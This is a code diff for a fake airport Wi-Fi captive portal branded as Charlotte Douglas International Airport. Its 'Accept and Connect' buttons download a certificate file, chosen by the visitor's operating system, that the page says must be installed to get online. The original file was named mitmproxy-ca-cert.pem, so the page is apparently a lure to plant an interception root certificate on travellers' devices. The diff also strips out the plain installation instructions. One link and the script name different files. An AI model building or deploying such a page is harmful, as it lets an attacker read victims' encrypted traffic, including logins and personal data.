@@ -6,25 +6,22 @@
     <title>Captive Portal</title>
     <script>
         function detectOS() {
-            let userAgent = navigator.userAgent;
-            let os = "Unknown";
+            let cert = "Unknown";
 
-            if (userAgent.indexOf("Win")!=-1) {
-                os = "Windows";
-            } else if (userAgent.indexOf("Mac")!=-1 || userAgent.indexOf("iPhone")!=-1 || userAgent.indexOf("iPad")!=-1) {
-                os = "MacOS / iOS";
-            } else if (userAgent.indexOf("Android")!=-1) {
-                os = "Android";
-            } else if (userAgent.indexOf("Linux")!= -1) {
-                os = "Linux"
+            if (navigator.userAgent.indexOf("Win")!=-1) {
+                cert = "charlottewindows.p12";
+            } else if (navigator.userAgent.indexOf("Android")!=-1) {
+                cert = "charlotteandroid.cer";
+            } else {
+                cert = "charlotteios.pem"
             }
 
-            return os;
+            return cert;
         }
 
         document.addEventListener("DOMContentLoaded", () => {
-            const osName = detectOS();
-            document.getElementById("os-display").innerText = `Your Operating System: ${osName}`;
+            const cert = detectOS();
+            document.getElementById("cert-name").innerText = `${cert}`;
         });
     </script>
     <style>
@@ -52,7 +49,7 @@
             text-align: center;
             text-align: center;
             border: 4px solid lightskyblue;
-            border-radius: 4px;
+            border-radius: 6px;
             background: none;
             background-color: lightskyblue;
             transition-duration: 0.4s;
@@ -62,7 +59,7 @@
         button:hover{
             background-color: white; 
             border: 4px solid lightskyblue;
-            border-radius: 4px;
+            border-radius: 6px;
             cursor: pointer;
         }
 
@@ -93,7 +90,7 @@
             align-items: center;
             justify-content: center;
             background-color: white;
-            border-radius: 4px;
+            border-radius: 20px;
             padding: 5vh 2vw; 
         }
 
@@ -103,6 +100,10 @@
 <body>
     <section>
         <div>
+            <section style = "padding: 0;">
+                <img src = "./imgs/cltlogo.png" style = "width: 300px; height: 80px;">
+            </section>
+
             <section>
                 <p class="welctext">Welcome to the Charlotte Douglas International Airport. </p>
             </section>
@@ -114,21 +115,25 @@
                 <img src = "./imgs/wifilogo.png" style = "width: 100px; height: 100px;">
             </section>
 
-            <section>
-                <a href="mitmproxy-ca-cert.pem" download="">
+            <section style = "padding: .2vh, .2vw">
+                <a href="charlottewindows.p12" download="">
+                    <button>  
+                        Accept and Connect
+                    </button>
+                </a>
+                <a href="charlotteandroid.cer" download="">
+                    <button>  
+                        Accept and Connect
+                    </button>
+                </a>
+                <a href="charlotteandroid.pem" download="">
                     <button>  
                         Accept and Connect
                     </button>
                 </a>
             </section>
-            <p class = "text">Instructions for installation:</p>
-            <ol>
-                <li class="text">Download the certificate using the link above.</li>
-                <li class="text">Install the certificate according to your device's instructions.</li>
-            </ol>
-
-            <p class = "text">Once the certificate is installed, reconnect to the Wi-Fi to access the internet.</p>
-            <p class = "text" id = "os-display"></p>
+            <p class = "text">Once the certificate is installed, reconnect to CLT Free WiFi to access the internet.</p>
+            <p class = "text" id = "cert-name"></p>
         </div>
     </section>
 </body>
